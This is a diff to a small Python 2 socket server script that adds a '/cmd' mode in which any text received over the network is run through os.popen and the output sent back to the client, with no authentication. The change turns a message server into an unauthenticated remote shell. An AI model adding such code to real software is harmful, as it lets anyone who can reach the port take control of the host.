@@ -1,20 +1,63 @@
 # coding=utf-8
 
 import socket
+from os import popen
+
+
+def exe_cmd(cmd):
+    try:
+        output = popen(cmd)
+        exe_result = output.read()
+    except:
+        exe_result = 'Executing cmd failed.'
+
+    return exe_result
+
+
+def handle_server_cmd(sock):
+    while True:
+        try:
+            data = ''
+            data_ = sock.recv(1024)
+            if not data_:
+                break
+            data += data_
+
+            print data
+
+            if data.startswith('/msg'):
+                sock.sendall('msg mode.')
+                handle_server(sock)
+            else:
+                exe_result = exe_cmd(data)
+                print exe_result
+                sock.sendall(exe_result)
+        except Exception, e:
+            print e
+            break
 
 
 def handle_server(sock):
     while True:
         try:
-            data = sock.recv(1024)
-            if not data:
+            data = ''
+            data_ = sock.recv(1024)
+            if not data_:
                 break
-            print 'receving:%s' % (data,)
+            data += data_
+
+            print data
+
+            if data.startswith('/cmd'):
+                sock.sendall('cmd mode.')
+                handle_server_cmd(sock)
+                break
+            else:
+                sock.sendall('msg recevied.')
+
         except Exception, e:
             print e
             break
-
-        sock.sendall('msg recevied')
 
 
 def init_server(addr):
